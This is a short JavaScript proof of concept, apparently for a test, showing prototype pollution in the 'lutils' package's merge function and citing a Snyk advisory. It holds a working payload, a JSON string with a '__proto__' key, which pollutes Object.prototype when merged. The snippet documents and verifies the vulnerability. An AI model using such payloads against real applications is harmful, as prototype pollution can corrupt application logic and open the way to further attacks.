// //https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023
// test("prototype pollution in lutils", () => {
  const lt = require("lutils");
  let obj = {};
console.log({}.polluted);

  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  lt.merge({}, EVIL_JSON);

console.log({}.polluted);
// });
